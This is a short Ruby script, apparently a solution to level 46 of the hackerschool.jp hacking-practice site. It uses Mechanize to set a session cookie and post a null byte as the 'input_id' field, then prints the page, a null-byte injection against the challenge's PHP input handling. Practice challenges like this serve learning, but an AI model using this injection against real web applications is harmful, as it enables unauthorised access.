#!/usr/bin/ruby
require 'mechanize'
mech=Mechanize.new
uri=URI.parse('http://www.hackerschool.jp/hack/take46.php')
str='PHPSESSID='
Mechanize::Cookie.parse(uri, str){|c|mech.cookie_jar.add(uri, c)}
mech.post(uri,{'input_id='=>"\0"})
puts mech.page.body